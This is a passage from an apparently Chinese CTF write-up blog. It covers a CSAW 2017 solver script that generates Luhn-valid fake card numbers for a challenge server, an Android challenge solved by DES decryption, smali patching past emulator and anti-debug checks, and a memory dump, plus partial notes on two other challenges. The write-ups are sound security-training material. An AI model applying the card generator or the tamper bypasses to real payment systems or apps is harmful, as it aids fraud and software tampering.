class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="comment"># author: garbu</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_card</span><span class="params">(type)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    Prefill some values based on the card type</span></div><div class="line"><span class="string">    """</span></div><div class="line">    card_types = [<span class="string">"americanexpress"</span>,<span class="string">"visa11"</span>, <span class="string">"visa16"</span>,<span class="string">"mastercard"</span>,<span class="string">"discover"</span>]</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prefill</span><span class="params">(t)</span>:</span></div><div class="line">        <span class="comment"># typical number of digits in credit card</span></div><div class="line">        def_length = <span class="number">16</span></div><div class="line">        </div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        Prefill with initial numbers and return it including the total number of digits</span></div><div class="line"><span class="string">        remaining to fill</span></div><div class="line"><span class="string">        """</span></div><div class="line">        <span class="keyword">if</span> <span class="string">'num:'</span> <span class="keyword">in</span> t:</div><div class="line">            <span class="keyword">return</span> [int(t[<span class="number">4</span>]), int(t[<span class="number">5</span>]), int(t[<span class="number">6</span>]), int(t[<span class="number">7</span>])], <span class="number">12</span></div><div class="line">        <span class="keyword">if</span> t == card_types[<span class="number">0</span>]:</div><div class="line">            <span class="comment"># american express starts with 3 and is 15 digits long</span></div><div class="line">            <span class="comment"># override the def lengths</span></div><div class="line">            <span class="keyword">return</span> [<span class="number">3</span>, randint(<span class="number">4</span>,<span class="number">7</span>)], <span class="number">13</span></div><div class="line">            </div><div class="line">        <span class="keyword">elif</span> t == card_types[<span class="number">1</span>] <span class="keyword">or</span> t == card_types[<span class="number">2</span>]:</div><div class="line">            <span class="comment"># visa starts with 4</span></div><div class="line">            <span class="keyword">if</span> t.endswith(<span class="string">"16"</span>):</div><div class="line">                <span class="keyword">return</span> [<span class="number">4</span>], def_length - <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">return</span> [<span class="number">4</span>], <span class="number">10</span></div><div class="line">            </div><div class="line">        <span class="keyword">elif</span> t == card_types[<span class="number">3</span>]:</div><div class="line">            <span class="comment"># master card start with 5 and is 16 digits long</span></div><div class="line">            <span class="keyword">return</span> [<span class="number">5</span>, randint(<span class="number">1</span>,<span class="number">5</span>)], def_length - <span class="number">2</span></div><div class="line">            </div><div class="line">        <span class="keyword">elif</span> t == card_types[<span class="number">4</span>]:</div><div class="line">            <span class="comment"># discover card starts with 6011 and is 16 digits long</span></div><div class="line">            <span class="keyword">return</span> [<span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], def_length - <span class="number">4</span></div><div class="line">            </div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="comment"># this section probably not even needed here</span></div><div class="line">            <span class="keyword">return</span> [], def_length</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finalize</span><span class="params">(nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        Make the current generated list pass the Luhn check by checking and adding</span></div><div class="line"><span class="string">        the last digit appropriately bia calculating the check sum</span></div><div class="line"><span class="string">        """</span></div><div class="line">        check_sum = <span class="number">0</span></div><div class="line">        </div><div class="line">        <span class="comment">#is_even = True if (len(nums) + 1 % 2) == 0 else False</span></div><div class="line">        </div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        Reason for this check offset is to figure out whther the final list is going</span></div><div class="line"><span class="string">        to be even or odd which will affect calculating the check_sum.</span></div><div class="line"><span class="string">        This is mainly also to avoid reversing the list back and forth which is specified</span></div><div class="line"><span class="string">        on the Luhn algorithm.</span></div><div class="line"><span class="string">        """</span></div><div class="line">        check_offset = (len(nums) + <span class="number">1</span>) % <span class="number">2</span></div><div class="line">        </div><div class="line">        <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(nums):</div><div class="line">            <span class="keyword">if</span> (i + check_offset) % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">                n_ = n*<span class="number">2</span></div><div class="line">                check_sum += n_ <span class="number">-9</span> <span class="keyword">if</span> n_ &gt; <span class="number">9</span> <span class="keyword">else</span> n_</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                check_sum += n</div><div class="line">        <span class="keyword">if</span> check_sum % <span class="number">10</span> == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> nums + [<span class="number">0</span>]</div><div class="line">        <span class="keyword">return</span> nums + [<span class="number">10</span> - (check_sum % <span class="number">10</span>) ]</div><div class="line">    </div><div class="line">    <span class="comment"># main body</span></div><div class="line">    t = type.lower()    </div><div class="line">    initial, rem = prefill(t)</div><div class="line">    so_far = initial + [randint(<span class="number">1</span>,<span class="number">9</span>) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(rem - <span class="number">1</span>)]</div><div class="line">    <span class="comment">#print "Card type: %s, " % t</span></div><div class="line">    cardnum = <span class="string">""</span>.join(map(str,finalize(so_far))).strip(<span class="string">'\n'</span>)</div><div class="line">    <span class="keyword">print</span> cardnum</div><div class="line">    <span class="keyword">return</span> cardnum</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># # run - check</span></div><div class="line"><span class="comment"># generate_card("discover")</span></div><div class="line"><span class="comment"># generate_card("mastercard")</span></div><div class="line"><span class="comment"># generate_card("americanexpress")</span></div><div class="line"></div><div class="line"><span class="comment"># generate_card("visa13")</span></div><div class="line"><span class="comment"># generate_card("visa16")</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ck</span><span class="params">(nums)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    Make the current generated list pass the Luhn check by checking and adding</span></div><div class="line"><span class="string">    the last digit appropriately bia calculating the check sum</span></div><div class="line"><span class="string">    """</span></div><div class="line">    check_sum = <span class="number">0</span></div><div class="line">    </div><div class="line">    is_even = <span class="keyword">True</span> <span class="keyword">if</span> ((len(nums) + <span class="number">1</span> )% <span class="number">2</span>) == <span class="number">0</span> <span class="keyword">else</span> <span class="keyword">False</span></div><div class="line">    </div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    Reason for this check offset is to figure out whther the final list is going</span></div><div class="line"><span class="string">    to be even or odd which will affect calculating the check_sum.</span></div><div class="line"><span class="string">    This is mainly also to avoid reversing the list back and forth which is specified</span></div><div class="line"><span class="string">    on the Luhn algorithm.</span></div><div class="line"><span class="string">    """</span></div><div class="line">    check_offset = (len(nums) + <span class="number">1</span>) % <span class="number">2</span></div><div class="line">    </div><div class="line">    <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(nums):</div><div class="line">        i = int(i)</div><div class="line">        n = int(n)</div><div class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</div><div class="line">            <span class="keyword">if</span> is_even:</div><div class="line">                n_ = n*<span class="number">2</span></div><div class="line">                check_sum += n_ <span class="number">-9</span> <span class="keyword">if</span> n_ &gt; <span class="number">9</span> <span class="keyword">else</span> n_</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                check_sum += n</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">if</span> (i + check_offset) % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">            n_ = n*<span class="number">2</span></div><div class="line">            check_sum += n_ <span class="number">-9</span> <span class="keyword">if</span> n_ &gt; <span class="number">9</span> <span class="keyword">else</span> n_</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            check_sum += n</div><div class="line">    <span class="keyword">if</span> check_sum % <span class="number">10</span> == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="number">10</span> - (check_sum % <span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ck2</span><span class="params">(nums)</span>:</span></div><div class="line">    digits = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> str(nums)]</div><div class="line">    odd_digits = digits[<span class="number">-1</span>::<span class="number">-2</span>]</div><div class="line">    even_digits = digits[<span class="number">-2</span>::<span class="number">-2</span>]</div><div class="line">    total = sum(odd_digits)</div><div class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> even_digits:</div><div class="line">        total += sum([int(i) <span class="keyword">for</span> i <span class="keyword">in</span> str(<span class="number">2</span> * digit)])</div><div class="line">    <span class="keyword">if</span> total % <span class="number">10</span> == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"1"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"0"</span></div><div class="line"></div><div class="line">conn = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">8308</span>)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    cmd = conn.recvline()</div><div class="line">    <span class="keyword">print</span> cmd,</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="string">'I need to know if '</span> <span class="keyword">in</span> cmd:</div><div class="line">        card = <span class="string">""</span>.join(filter(str.isdigit, cmd))</div><div class="line">        card = card[:<span class="number">-2</span>]</div><div class="line">        <span class="keyword">print</span> card</div><div class="line">        conn.sendline(ck2(card))</div><div class="line">        conn.recvline()</div><div class="line"></div><div class="line">    <span class="keyword">elif</span> <span class="string">'Visa'</span> <span class="keyword">in</span> cmd:</div><div class="line">        conn.sendline(generate_card(<span class="string">'visa16'</span>))</div><div class="line">    <span class="keyword">elif</span> <span class="string">'MasterCard'</span> <span class="keyword">in</span> cmd:</div><div class="line">        conn.sendline(generate_card(<span class="string">'mastercard'</span>))</div><div class="line">    <span class="keyword">elif</span> <span class="string">'Discover'</span> <span class="keyword">in</span> cmd:</div><div class="line">        conn.sendline(generate_card(<span class="string">'discover'</span>))</div><div class="line">    <span class="keyword">elif</span> <span class="string">'American Express'</span> <span class="keyword">in</span> cmd:</div><div class="line">        conn.sendline(generate_card(<span class="string">'americanexpress'</span>))</div><div class="line">    <span class="keyword">elif</span> <span class="string">'starts with'</span> <span class="keyword">in</span> cmd:</div><div class="line">        num = generate_card(<span class="string">"num:"</span> + cmd[<span class="number">-6</span>:<span class="number">-2</span>])</div><div class="line">        conn.sendline(num)</div><div class="line">    <span class="keyword">elif</span> <span class="string">'ends with'</span> <span class="keyword">in</span> cmd <span class="keyword">and</span> cmd[<span class="number">-4</span>] <span class="keyword">in</span> <span class="string">'01234567890'</span>:</div><div class="line">        num = cmd[<span class="number">-6</span>:<span class="number">-2</span>]</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            card = generate_card(<span class="string">'visa11'</span>) + <span class="string">'1'</span> + num</div><div class="line">            <span class="keyword">if</span> ck(card[:<span class="number">-1</span>]) == int(card[<span class="number">-1</span>]):</div><div class="line">                <span class="keyword">print</span> card</div><div class="line">                conn.sendline(card)</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">elif</span> <span class="string">'ends with'</span> <span class="keyword">in</span> cmd:</div><div class="line">        num = cmd[<span class="number">-3</span>:<span class="number">-2</span>]</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            card = generate_card(<span class="string">'visa16'</span>)</div><div class="line">            <span class="keyword">if</span> card[<span class="number">-1</span>] == num:</div><div class="line">                conn.sendline(card)</div><div class="line">                <span class="keyword">break</span>;</div><div class="line"></div><div class="line">    <span class="keyword">print</span> conn.recvline(),</div></pre></td></tr></table></figure></p>
<h2 id="tabIEZ"><a href="#tabIEZ" class="headerlink" title="tabIEZ"></a>tabIEZ</h2><p>Ascii值用表置换，长度不长直接手动查表逐位算出来的</p>
<p><img src="tu.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/28/csaw2017-cvv/" data-id="cj86rj00r000kgo99ia4a9f8a" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/csaw2017/">csaw2017</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/">misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-helctf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/28/helctf/" class="article-date">
  <time datetime="2017-09-28T08:49:43.000Z" itemprop="datePublished">2017-09-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/28/helctf/">360 Hello CTF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="HelloCTF"><a href="#HelloCTF" class="headerlink" title="HelloCTF"></a>HelloCTF</h1><p>纯Java,没有任何反调试,实质上是一道编程题.</p>
<p>逐行仔细分析代码可以不断得到关系,输入是一个22字符长的小写a-z字符串,约束关系总结如下:</p>
<p>v8 v9 = 4   19 分别是上述序号英文字符</p>
<p>四次出现的位置5 8 10 12</p>
<p>三次 3 16 19</p>
<p><img src="helctf/1.png" alt="1"></p>
<p>pos4 ^ pos3 = 22</p>
<p>pos6^pos7=5</p>
<p>pos7^pos8 = 12</p>
<p>p9=118</p>
<p>p11=109</p>
<p>p13 = 106</p>
<p>p14 117</p>
<p>p15 115</p>
<p>(ord</p>
<p>有一个watch夹在中间</p>
<p>以don开头</p>
<p>得到结论dontbelievemejustwatch</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/28/helctf/" data-id="cj86rj00r000fgo990jo6vbn5" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-zctf-android-1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/28/zctf-android-1/" class="article-date">
  <time datetime="2017-09-28T08:49:43.000Z" itemprop="datePublished">2017-09-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/28/zctf-android-1/">ZCTF Android 1</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>先做笔记,最后整理成题解.</p>
<p>首先对APK的Java层代码进行分析.入口的逻辑在Login.attemptLogin函数中该函数调用Auth.auth对用户名密码进行校验.</p>
<p><img src="image/1.png" alt="1"></p>
<p>此处校验有一个读取数据库的函数databaseopt,其逻辑就在下边定义,但是其实不用看,key.db文件就在程序目录中,用随便一个数据库查看器可以看到唯一的键值</p>
<p><img src="image/2.png" alt="2"></p>
<p>所以,auth函数参数0=context,1=yonghuming+mima,2=”zctf2016”<br>下面分析Auth和auth逻辑.</p>
<p><img src="image/3.png" alt="3"></p>
<p>Auth有auth,encrypt和decrypt三个函数,后二者是des加解密.auth的逻辑恢复的有些混乱,分析得到黄色部分需要与apk资源中的flag.bin内容进行比较.用python对flag.bin进行des解密还原.盗用程序自带的DES解密,得到结果</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line"></div><div class="line">    String password = <span class="string">"zctf2016"</span>;</div><div class="line">    File file = <span class="keyword">new</span> File(<span class="string">"C:\\Users\\hyrathon\\Desktop\\Solve\\Android1\\assets\\flag.bin"</span>);</div><div class="line">    FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</div><div class="line">    <span class="keyword">byte</span>[] str= <span class="keyword">new</span> <span class="keyword">byte</span>[fileInputStream.available()];</div><div class="line">    fileInputStream.read(str);</div><div class="line">    <span class="keyword">byte</span>[] ans = decrypt(str, password);</div><div class="line">    System.out.println(<span class="keyword">new</span> String(ans));</div><div class="line">&#125;</div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] src, String password) <span class="keyword">throws</span> Exception &#123;</div><div class="line">    SecureRandom v3 = <span class="keyword">new</span> SecureRandom();</div><div class="line">    SecretKey v4 = SecretKeyFactory.getInstance(<span class="string">"DES"</span>).generateSecret(<span class="keyword">new</span> DESKeySpec(password.getBytes()));</div><div class="line">    Cipher v0 = Cipher.getInstance(<span class="string">"DES"</span>);</div><div class="line">    v0.init(<span class="number">2</span>, ((Key)v4), v3);</div><div class="line">    <span class="keyword">return</span> v0.doFinal(src);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>}sihttoN{ftcz,根据原来程序的逻辑,这段是取逆之后的用户名加密码即原来应该为zctf{Notthis},用户名为zctf,密码{Notthis}.到此这部分结<img src="image/4.png" alt="4">束.这一部分目前没有什么影响,因为不计算密码直接改Smali逻辑也可以绕过.检查密码正确后会启动一个新的Activity,密码作为extra参数传给这个Activity,在后面会用到,按下不表.</p>
<p>接下来考察打开的app这个Activity,其中又增加了新的模拟器检验</p>
<p><img src="image/5.png" alt="5"></p>
<p>task中会结束进程</p>
<p><img src="image/6.png" alt="6"></p>
<p>修改Smali绕过这处检验<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">move-result v0</div><div class="line"></div><div class="line">   <span class="built_in"> if-eqz </span>v0,<span class="keyword"> :cond_c</span></div><div class="line"></div><div class="line"><span class="keyword">    .line</span> 106</div><div class="line">   <span class="built_in"> const/4 </span>v0, 0x0</div><div class="line">    </div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v0&#125;, <span class="class">Ljava/lang/System;</span>-&gt;exit(I)V</div></pre></td></tr></table></figure></p>
<p>if-eqz改为if-nez,绕过此处.</p>
<p>接下来绕过add函数,这个函数是native,检查proc/procid/status中第五项,在android的环境中是tracer</p>
<p><img src="image/7.png" alt="7"></p>
<p>通过检查该项值判断是否被调试,然而没有什么卵用直接Java层绕过…….话说这个函数伪装成add还传入两个参数,但是并没有用.</p>
<p>接下来pushbottom函数将bottom拷贝到/data/data/com.zctf.app/files/目录下,接下来app调用native函数sayHelloInc,将pass={Notthis}作为参数传入.Java静态部分完成,接下来IDA考察这个函数的功能.</p>
<p><img src="image/8.png" alt="8"></p>
<p> 上图是关键的一个分支,注意有一个DES解密函数跳转,这里R7储存的是malloc到堆上边的地址,指向解密后的内容,随后两个free,之后就too_late了,所以要在des执行后,free执行前获得r7指向的内存.需要进行动态调试.</p>
<p><img src="image/9.png" alt="9"></p>
<p>首先考察这里的静态代码,又是熟悉的假add函数,在动态attach上去之后首先修改这里,否则会被发现调试退出,在mov r6,r0下断点强行改变r0=0,接下来执行到free之前,看r7地址,G到内存</p>
<p><img src="image/10.png" alt="10"></p>
<p>看到了熟悉的PNG头,从这里开始向下把内存内容dump出来.<br>(这里插两句,ida的android_server只支持arm所以一开始静态分析最好直接从arm开始,该应用lib中包含了x86我没忍住就看了,后来耽误很多时间重新看arm.另外,程序不用的so IDA是检查不到module的,在attach时候加一个”载入新库停下来”然后在其中下断点.)</p>
<p>将复制的内容另存为png图像,使用stegSolve打开图片查图层得到frog(啥?)</p>
<p><img src="image/11.png" alt="11"></p>
<p>就酱.<br><a href="http://pan.baidu.com/s/1dEEnQk5" target="_blank" rel="external">http://pan.baidu.com/s/1dEEnQk5</a><br>6bjm</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/28/zctf-android-1/" data-id="cj86rj021001ego99dbzm1lpq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-boomshakalaka-3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/28/boomshakalaka-3/" class="article-date">
  <time datetime="2017-09-28T08:49:43.000Z" itemprop="datePublished">2017-09-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/28/boomshakalaka-3/">0CTF 2016 boomshakalaka-3</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="0CTF-boomshakalaka-3"><a href="#0CTF-boomshakalaka-3" class="headerlink" title="0CTF : boomshakalaka-3"></a>0CTF : boomshakalaka-3</h1><p><strong>Category:</strong> Mobile<br><strong>Points:</strong> 3<br><strong>Solves:</strong> 35<br><strong>Description:</strong></p>
<blockquote>
<p>play the game, get the highest score</p>
</blockquote>
<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h2><p>脑洞题, 基础的分析之后可以发现是由Cocos2d写的游戏程序, 部分与flag有关的代码在Java层, 在sharedPreference里边写了MGNO, 进一步的写sharedPreference在native代码中寻找.</p>
<p>从updateScore函数中可以发现根据分数写flag的明显痕迹, 其他方法中也有一部分写的代码, 但是顺序未知.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">100</span> )</div><div class="line">    &#123;</div><div class="line">      v6 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v22, &amp;v20, <span class="string">"MW"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v6, &amp;v34, &amp;v22);</div><div class="line">      v7 = &amp;v22;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">600</span> )</div><div class="line">    &#123;</div><div class="line">      v8 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v23, &amp;v20, <span class="string">"Rf"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v8, &amp;v34, &amp;v23);</div><div class="line">      v7 = &amp;v23;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">700</span> )</div><div class="line">    &#123;</div><div class="line">      v9 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v24, &amp;v20, <span class="string">"Rz"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v9, &amp;v34, &amp;v24);</div><div class="line">      v7 = &amp;v24;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">3000</span> )</div><div class="line">    &#123;</div><div class="line">      v10 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v25, &amp;v20, <span class="string">"Bt"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v10, &amp;v34, &amp;v25);</div><div class="line">      v7 = &amp;v25;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">5600</span> )</div><div class="line">    &#123;</div><div class="line">      v11 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v26, &amp;v20, <span class="string">"RV"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v11, &amp;v34, &amp;v26);</div><div class="line">      v7 = &amp;v26;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">9900</span> )</div><div class="line">    &#123;</div><div class="line">      v12 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v27, &amp;v20, <span class="string">"9Z"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v12, &amp;v34, &amp;v27);</div><div class="line">      v7 = &amp;v27;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">18000</span> )</div><div class="line">    &#123;</div><div class="line">      v13 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v28, &amp;v20, <span class="string">"b1"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v13, &amp;v34, &amp;v28);</div><div class="line">      v7 = &amp;v28;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">88800</span> )</div><div class="line">    